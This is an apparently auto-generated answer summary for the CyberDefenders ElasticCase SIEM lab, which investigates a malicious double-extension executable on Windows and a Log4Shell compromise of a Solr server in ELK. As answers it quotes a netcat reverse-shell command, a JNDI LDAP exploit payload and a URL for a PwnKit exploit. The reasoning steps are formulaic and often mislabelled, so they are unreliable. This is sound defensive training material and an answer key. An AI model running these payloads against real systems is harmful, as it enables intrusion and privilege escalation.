# ElasticCase Lab

## Case Metadata

- Category: `SIEM (ELK, Splunk, etc.)`
- Platform: `CyberDefenders`
- Difficulty: `Medium`
- Source PDF: `https://github.com/tim-barc/ctf_writeups/blob/main/writeups/cyber_defenders_elasticcase_lab.pdf`

## Why This Case Matters

Use this case as a SIEM (ELK, Splunk, etc.) reference for ids, registry, siem challenges.

## Input Signals

- Artifacts: ids, registry, siem
- Tools: elk
- Techniques: dns-analysis, http-analysis, privilege-escalation, service-enumeration, siem-query

## First-Principles Route

- Translate the question into searchable fields such as host, user, process, index, sourcetype, URI, IP, hash, or event code.
- Run broad time-bounded searches first, then narrow by event type, field value, and correlation chain.
- Keep the exact query shape and the evidence field that proves each answer.

## Solve Thinking

### Step 1: root access. Subsequently, the threat actor exploited the Log4Shell vulnerability on a CentOS

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `visualising and correlating events.`

### Step 2: Who downloads the malicious file which has a double extension?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `event.code : "11" AND file.name : *.*.*` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `event.code : "11" AND file.name : *.*.*`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `event.code : "11" AND file.name : *.*.*` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `ahmed`

### Step 3: What is the hostname he was using?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `DESKTOP-Q1SL9P2`

### Step 4: What is the name of the malicious file?

- Route type: `elk-driven evidence lookup`
- Why: For SIEM (ELK, Splunk, etc.), keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use elk to collect the smallest evidence slice that answers the goal.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as elk-driven evidence lookup.
  - Use elk to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `Acount_details.pdf.exe`

### Step 5: What is the attacker's IP address?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `event.code : "3" AND process.name : "Acount_details.pdf.exe"` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `event.code : "3" AND process.name : "Acount_details.pdf.exe"`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `event.code : "3" AND process.name : "Acount_details.pdf.exe"` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `192.168.1.10`

### Step 6: Another user with high privilege runs the same malicious file. What is the username?

- Route type: `memory artifact analysis`
- Why: Memory routes start broad with process/socket inventory, then narrow to suspicious process evidence.
- Probe: Use elk to enumerate processes, network sockets, injected regions, and command lines.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as memory artifact analysis.
  - Use elk to enumerate processes, network sockets, injected regions, and command lines.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `cybery`

### Step 7: The attacker was able to upload a DLL file of size 8704. What is the file name?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `mCblHDgWP .dll`

### Step 8: What parent process name spawns cmd with NT AUTHORITY privilege and pid 10716?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `rundll32.exe`

### Step 9: The previous process was able to access a registry. What is the full path of the registry?

- Route type: `registry artifact correlation`
- Why: Registry artifacts are strongest when paired with timestamp and user context.
- Probe: Use elk to inspect registry hives or parsed registry artifacts for persistence and user activity.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as registry artifact correlation.
  - Use elk to inspect registry hives or parsed registry artifacts for persistence and user activity.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled`

### Step 10: PowerShell process with pid 8836 changed a file in the system. What was that filename?

- Route type: `timeline reconstruction`
- Why: Timeline questions should be answered from normalized artifact timestamps with timezone assumptions recorded.
- Probe: Use elk to align timestamps and identify the event that satisfies the question.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as timeline reconstruction.
  - Use elk to align timestamps and identify the event that satisfies the question.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `ModuleAnalysisCache`

### Step 11: file that has been created?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `process.pid : 11676 AND event.code : 11` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `process.pid : 11676 AND event.code : 11`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `process.pid : 11676 AND event.code : 11` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `__PSScriptPolicyTest_bymwxuft.3b5.ps1`

### Step 12: What is the machine's IP address that is in the same LAN as a windows machine?

- Route type: `credential discovery`
- Why: When a capture or logs mention a cleartext protocol, check credentials and followed streams before expensive analysis.
- Probe: Use elk to inspect credentials, authentication fields, or followed streams before deeper analysis.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as credential discovery.
  - Use elk to inspect credentials, authentication fields, or followed streams before deeper analysis.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `192.168.10.30`

### Step 13: he was successfully login with?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `salem`

### Step 14: full URL of the repo?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk with the extracted filter/query `wget*` and inspect the matching evidence.
- Tools: elk
- Filters or commands:
  - `wget*`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk with the extracted filter/query `wget*` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-`

### Step 15: process's md5 hash?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `3a4ad518e9e404a6bad3d39dfebaf2f6`

### Step 16: 3011 with the root user. What is the command?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `bash -i`

### Step 17: If you navigate back to the Alerts tab, we can see that the rule name "Netcat Network Activity"?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use elk to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `CentOS`

### Step 18: What is the username who ran netcat?

- Route type: `elk-driven evidence lookup`
- Why: For SIEM (ELK, Splunk, etc.), keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use elk to collect the smallest evidence slice that answers the goal.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as elk-driven evidence lookup.
  - Use elk to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `solr`

### Step 19: What is the parent process name of netcat?

- Route type: `memory artifact analysis`
- Why: Memory routes start broad with process/socket inventory, then narrow to suspicious process evidence.
- Probe: Use elk to enumerate processes, network sockets, injected regions, and command lines.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as memory artifact analysis.
  - Use elk to enumerate processes, network sockets, injected regions, and command lines.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `java`

### Step 20: reverse shell. Write the full command?

- Route type: `elk-driven evidence lookup`
- Why: For SIEM (ELK, Splunk, etc.), keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use elk to collect the smallest evidence slice that answers the goal.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as elk-driven evidence lookup.
  - Use elk to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `nc -e /bin/bash 192.168.1.10 9999`

### Step 21: What is the entire log file path of the "solr" application?

- Route type: `memory artifact analysis`
- Why: Memory routes start broad with process/socket inventory, then narrow to suspicious process evidence.
- Probe: Use elk to enumerate processes, network sockets, injected regions, and command lines.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as memory artifact analysis.
  - Use elk to enumerate processes, network sockets, injected regions, and command lines.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `/var/solr/logs/solr.log`

### Step 22: What is the path that is vulnerable to log4j?

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use elk to filter DNS traffic and pivot from source host to queried domain or resolver.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `/admin/cores`

### Step 23: What is the GET request parameter used to deliver log4j payload?

- Route type: `elk-driven evidence lookup`
- Why: For SIEM (ELK, Splunk, etc.), keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use elk to collect the smallest evidence slice that answers the goal.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as elk-driven evidence lookup.
  - Use elk to collect the smallest evidence slice that answers the goal.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `foo`

### Step 24: What is the JNDI payload that is connected to the LDAP port?

- Route type: `elk-driven evidence lookup`
- Why: For SIEM (ELK, Splunk, etc.), keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use elk to collect the smallest evidence slice that answers the goal.
- Tools: elk
- Reasoning chain:
  - Recognize the goal as elk-driven evidence lookup.
  - Use elk to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `{foo=${jndi:ldap://192.168.1.10:1389/Exploit}}`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
